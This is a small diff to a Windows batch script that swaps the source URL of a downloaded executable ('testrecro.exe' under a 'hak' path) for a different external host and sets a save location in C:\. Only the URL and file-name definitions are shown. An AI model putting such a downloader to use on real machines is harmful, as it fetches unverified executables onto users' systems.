@@ -2,7 +2,7 @@
 SETLOCAL
 
 REM Define the URL of the file to download
-SET "url=http://thejohnsons.net.nz/source/hak/testrecro.exe"
+SET "url=http://projects.stuffandthings.cc/source/hak/testrecro.exe"
 
 REM Define the name of the file to save
 SET "output=C:\thatscrazytestrecrocalc4853.v32.exe"
